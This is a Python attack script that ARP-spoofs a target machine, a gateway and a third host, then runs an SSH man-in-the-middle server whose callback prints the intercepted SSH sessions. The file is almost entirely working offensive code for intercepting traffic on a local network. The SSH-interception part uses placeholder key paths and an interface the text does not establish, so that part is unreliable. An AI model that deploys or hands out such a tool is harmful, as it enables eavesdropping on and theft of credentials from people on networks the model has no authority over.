import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sniff, send

from ssh_mitm import SSHMitm, SSHConfig, SSHPayload, SSHConnection

import time

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)



# Define a callback function to handle intercepted SSH connections
def handle_ssh(payload: SSHPayload, conn: SSHConnection):
    # You can inspect and modify the SSH payload here
    print("Intercepted SSH connection:")
    print(payload)

# Create an SSH configuration
config = SSHConfig(
    host_keys=["/path/to/your/host/keys"],  # Path to SSH host keys
    authorized_keys="/path/to/your/authorized_keys",  # Path to SSH authorized keys
    interceptors=[handle_ssh]  # List of callback functions to handle intercepted connections
)

# Create an SSHMitm instance
mitm = SSHMitm(config)

# Start the SSHMitm server




target_ip = "10.0.0.11"  
gateway_ip = "10.0.0.1"
bob_ip = "10.0.0.12"  

try:
    mitm.start_server()
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        spoof(target_ip, bob_ip)
        spoof(bob_ip, target_ip)
        sent_packets_count += 4
        print(f"\r[*] Packets Sent: {sent_packets_count}", end="")
        time.sleep(2)  # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] ARP Spoof Stopped")
    mitm.stop_server()
